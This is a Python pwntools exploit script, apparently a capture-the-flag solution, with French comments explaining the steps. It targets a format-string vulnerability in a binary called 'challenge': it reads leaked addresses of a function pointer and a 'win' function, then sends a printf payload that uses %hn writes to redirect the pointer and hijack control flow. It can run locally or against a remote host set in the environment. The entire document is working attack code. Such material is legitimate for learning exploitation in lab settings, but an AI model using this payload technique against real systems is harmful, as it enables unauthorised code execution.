#!/usr/bin/env python3
from pathlib import Path

from pwn import *


def fmt_write_qword_halfwords(addr: int, value: int) -> bytes:
    """
    Ici, on sait que printf reçoit 4 arguments pointeurs:
      1 -> &fp
      2 -> &fp+2
      3 -> &fp+4
      4 -> &fp+6
    On écrit value (64-bit) en 4 * 16-bit via %hn.
    """
    parts = [(value >> (16 * i)) & 0xFFFF for i in range(4)]

    # On va écrire dans l'ordre croissant des valeurs pour minimiser les pads.
    order = sorted(range(4), key=lambda i: parts[i])
    printed = 0
    fmt = ""
    for idx in order:
        target = parts[idx]
        pad = (target - printed) & 0xFFFF
        if pad:
            # On utilise un argument dédié (arg 5) pour le %c,
            # sinon on "mange" les arguments et on casse les %hn.
            fmt += f"%5${pad}c"
            printed = (printed + pad) & 0xFFFF
        fmt += f"%{idx+1}$hn"
    return fmt.encode()


def main():
    context.log_level = os.getenv("LOG", "info")
    here = Path(__file__).resolve().parent
    context.binary = elf = ELF(str(here / "challenge"), checksec=False)

    host = os.getenv("HOST")
    port = int(os.getenv("PORT", "1337"))
    io = remote(host, port) if host else process(elf.path, cwd=str(here))

    io.recvuntil(b"fp @ ")
    fp_addr = int(io.recvline().strip(), 16)
    io.recvuntil(b"win @ ")
    win_addr = int(io.recvline().strip(), 16)

    log.info("fp @ %#x", fp_addr)
    log.info("win @ %#x", win_addr)

    io.recvuntil(b"format string) :\n")
    payload = fmt_write_qword_halfwords(fp_addr, win_addr) + b"\n"
    io.send(payload)
    io.interactive()


if __name__ == "__main__":
    main()
